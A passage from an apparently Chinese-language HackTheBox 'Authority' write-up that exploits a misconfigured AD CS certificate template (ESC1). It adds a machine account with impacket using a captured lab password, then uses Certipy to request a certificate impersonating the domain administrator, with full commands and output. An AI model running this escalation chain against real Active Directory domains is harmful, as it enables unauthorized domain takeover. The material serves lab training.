</span><span id="__span-18-54"><a id="__codelineno-18-54" name="__codelineno-18-54" href="#__codelineno-18-54"></a>        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">512</span>
</span><span id="__span-18-55"><a id="__codelineno-18-55" name="__codelineno-18-55" href="#__codelineno-18-55"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Computers</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">515</span>
</span><span id="__span-18-56"><a id="__codelineno-18-56" name="__codelineno-18-56" href="#__codelineno-18-56"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-18-57"><a id="__codelineno-18-57" name="__codelineno-18-57" href="#__codelineno-18-57"></a>      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
</span><span id="__span-18-58"><a id="__codelineno-18-58" name="__codelineno-18-58" href="#__codelineno-18-58"></a>        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">HTB</span><span class="p">\</span><span class="n">Administrator</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">500</span>
</span><span id="__span-18-59"><a id="__codelineno-18-59" name="__codelineno-18-59" href="#__codelineno-18-59"></a>        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">HTB</span><span class="p">\</span><span class="n">Administrator</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">500</span>
</span><span id="__span-18-60"><a id="__codelineno-18-60" name="__codelineno-18-60" href="#__codelineno-18-60"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">512</span>
</span><span id="__span-18-61"><a id="__codelineno-18-61" name="__codelineno-18-61" href="#__codelineno-18-61"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-18-62"><a id="__codelineno-18-62" name="__codelineno-18-62" href="#__codelineno-18-62"></a>        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">HTB</span><span class="p">\</span><span class="n">Administrator</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">500</span>
</span><span id="__span-18-63"><a id="__codelineno-18-63" name="__codelineno-18-63" href="#__codelineno-18-63"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">512</span>
</span><span id="__span-18-64"><a id="__codelineno-18-64" name="__codelineno-18-64" href="#__codelineno-18-64"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-18-65"><a id="__codelineno-18-65" name="__codelineno-18-65" href="#__codelineno-18-65"></a>        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">HTB</span><span class="p">\</span><span class="n">Administrator</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">500</span>
</span><span id="__span-18-66"><a id="__codelineno-18-66" name="__codelineno-18-66" href="#__codelineno-18-66"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">512</span>
</span><span id="__span-18-67"><a id="__codelineno-18-67" name="__codelineno-18-67" href="#__codelineno-18-67"></a>                                      <span class="n">HTB</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-18-68"><a id="__codelineno-18-68" name="__codelineno-18-68" href="#__codelineno-18-68"></a>
</span><span id="__span-18-69"><a id="__codelineno-18-69" name="__codelineno-18-69" href="#__codelineno-18-69"></a>
</span><span id="__span-18-70"><a id="__codelineno-18-70" name="__codelineno-18-70" href="#__codelineno-18-70"></a>
</span><span id="__span-18-71"><a id="__codelineno-18-71" name="__codelineno-18-71" href="#__codelineno-18-71"></a><span class="n">Certify</span> <span class="n">completed</span> <span class="k">in</span> <span class="n">00</span><span class="p">:</span><span class="n">00</span><span class="p">:</span><span class="n">09</span><span class="p">.</span><span class="n">7458664</span>
</span></code></pre></div></p>
<p>注意到漏洞模板其中的 <code>msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</code>，即满足<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1">ESC1</a>的利用条件（CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT）。<br />
以及 <code>HTB\Domain Computers</code> 具有“Enrollment”权限。而我们当前的账户正好有将机器加入域的权限。如果我们新加入一个机器，便有机器账户，应该就可以利用这个模板？ </p>
<h4 id="impacket-addcomputer">impacket-addcomputer添加机器账户<a class="headerlink" href="#impacket-addcomputer" title="Permanent link">&para;</a></h4>
<p>搜了一下发现impacket有 <code>addcomputer.py</code> 可以直接添加机器账户。</p>
<p>有个小报错，不过确认了一下成功添加了机器账户。<br />
<em>（后来突然意识到账号处的域名不应该是“HTB”而是“authority.htb”……即凭据该用 <code>authority.htb/svc_ldap:lDaP_1n_th3_cle4r!</code>）</em></p>
<p>kali运行命令添加机器账户（OU等具体配置是来自上面拦截的 <code>svc_ldap</code> LDAP明文凭据，随便弄个就与其保持一致了）：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>└─$<span class="w"> </span>/usr/share/doc/python3-impacket/examples/addcomputer.py<span class="w"> </span>-computer-name<span class="w"> </span>TEST$<span class="w"> </span>-computer-pass<span class="w"> </span>qwerasdf<span class="w"> </span>-baseDN<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>authority,DC<span class="o">=</span>htb<span class="w"> </span>-computer-group<span class="w"> </span><span class="nv">OU</span><span class="o">=</span><span class="s1">&#39;Service Accounts&#39;</span>,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>HTB/svc_ldap:lDaP_1n_th3_cle4r!<span class="w"> </span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>DC<span class="w"> </span>host<span class="w"> </span><span class="nb">set</span><span class="w"> </span>and<span class="w"> </span><span class="s1">&#39;HTB&#39;</span><span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>look<span class="w"> </span>like<span class="w"> </span>a<span class="w"> </span>FQDN.<span class="w"> </span>DNS<span class="w"> </span>resolution<span class="w"> </span>of<span class="w"> </span>short<span class="w"> </span>names<span class="w"> </span>will<span class="w"> </span>probably<span class="w"> </span>fail.
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>TEST$<span class="w"> </span>with<span class="w"> </span>password<span class="w"> </span>qwerasdf.
</span></code></pre></div></p>
<p>目标机器确认：
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="nb">group </span><span class="s2">&quot;Domain Computers&quot;</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">Group </span><span class="n">name</span>     <span class="n">Domain</span> <span class="n">Computers</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">Comment</span>        <span class="n">All</span> <span class="n">workstations</span> <span class="n">and</span> <span class="n">servers</span> <span class="n">joined</span> <span class="n">to</span> <span class="n">the</span> <span class="n">domain</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">Members</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="p">-------------------------------------------------------------------------------</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">TEST</span><span class="p">$</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
</span></code></pre></div></p>
<h4 id="abuse-by-certipy">Abuse by Certipy<a class="headerlink" href="#abuse-by-certipy" title="Permanent link">&para;</a></h4>
<p>我们当前用户是 <code>svc_ldap</code>，而要利用的用户是我们自己添加的机器账户 <code>TEST$</code>。看了下Certify似乎只能用当前用户冒充其他用户（如管理员）。所以使用<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse">hacktrick</a>上说的另一个工具：Certipy。</p>
<p>根据<a href="https://github.com/ly4k/Certipy#installation">github文档</a>安装Certipy：<code>pip3 install certipy-ad</code>。<br />
加入PATH：<code>export PATH=~/.local/bin:$PATH</code>。</p>
<h5 id="_4">小插曲：迷之报错<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h5>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;qwerasdf&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;CorpVPN&#39;</span><span class="w"> </span>-upn<span class="w"> </span>administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate:<span class="w"> </span>code:<span class="w"> </span>0x80094800<span class="w"> </span>-<span class="w"> </span>CERTSRV_E_UNSUPPORTED_CERT_TYPE<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>requested<span class="w"> </span>certificate<span class="w"> </span>template<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>supported<span class="w"> </span>by<span class="w"> </span>this<span class="w"> </span>CA.
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">5</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>Would<span class="w"> </span>you<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>save<span class="w"> </span>the<span class="w"> </span>private<span class="w"> </span>key?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;qwerasdf&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-target<span class="w"> </span>authority.htb<span class="w"> </span>-template<span class="w"> </span>CorpVPN<span class="w"> </span>-upn<span class="w"> </span>administrator@authority.htb<span class="w"> </span>-dns<span class="w"> </span>authority.authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate:<span class="w"> </span>code:<span class="w"> </span>0x80094800<span class="w"> </span>-<span class="w"> </span>CERTSRV_E_UNSUPPORTED_CERT_TYPE<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>requested<span class="w"> </span>certificate<span class="w"> </span>template<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>supported<span class="w"> </span>by<span class="w"> </span>this<span class="w"> </span>CA.
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">6</span>
</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>Would<span class="w"> </span>you<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>save<span class="w"> </span>the<span class="w"> </span>private<span class="w"> </span>key?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>y
</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="m">6</span>.key
</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate
</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>
</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>
</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;qwerasdf&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-target<span class="w"> </span>authority.htb<span class="w"> </span>-template<span class="w"> </span>CorpVPN<span class="w"> </span>-upn<span class="w"> </span>administrator@authority.htb<span class="w"> </span>-dns<span class="w"> </span>authority.authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-debug
</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>
</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>resolve<span class="w"> </span><span class="s1">&#39;authority.htb&#39;</span><span class="w"> </span>at<span class="w"> </span><span class="s1">&#39;10.10.11.222&#39;</span>
</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>RSA<span class="w"> </span>key
</span><span id="__span-21-30"><a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-21-31"><a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-21-32"><a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-21-33"><a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate:<span class="w"> </span>code:<span class="w"> </span>0x80094800<span class="w"> </span>-<span class="w"> </span>CERTSRV_E_UNSUPPORTED_CERT_TYPE<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>requested<span class="w"> </span>certificate<span class="w"> </span>template<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>supported<span class="w"> </span>by<span class="w"> </span>this<span class="w"> </span>CA.
</span><span id="__span-21-34"><a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">7</span>
</span><span id="__span-21-35"><a id="__codelineno-21-35" name="__codelineno-21-35" href="#__codelineno-21-35"></a>Would<span class="w"> </span>you<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>save<span class="w"> </span>the<span class="w"> </span>private<span class="w"> </span>key?<span class="w"> </span><span class="o">(</span>y/N<span class="o">)</span><span class="w"> </span>
</span><span id="__span-21-36"><a id="__codelineno-21-36" name="__codelineno-21-36" href="#__codelineno-21-36"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>certificate
</span></code></pre></div>
<h5 id="certipy">certipy请求证书<a class="headerlink" href="#certipy" title="Permanent link">&para;</a></h5>
<p>隔了两天接着打，突然可以了？？<br />
之前还以为是option的问题，不过试了下上回报错的两个命令现在都可以：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;qwerasdf&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-target<span class="w"> </span>authority.htb<span class="w"> </span>-template<span class="w"> </span>CorpVPN<span class="w"> </span>-upn<span class="w"> </span>administrator@authority.htb<span class="w"> </span>-dns<span class="w"> </span>authority.authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-debug
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>resolve<span class="w"> </span><span class="s1">&#39;authority.htb&#39;</span><span class="w"> </span>at<span class="w"> </span><span class="s1">&#39;10.10.11.222&#39;</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>RSA<span class="w"> </span>key
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">9</span>
</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>multiple<span class="w"> </span>identifications
</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="w">    </span>UPN:<span class="w"> </span><span class="s1">&#39;administrator@authority.htb&#39;</span>
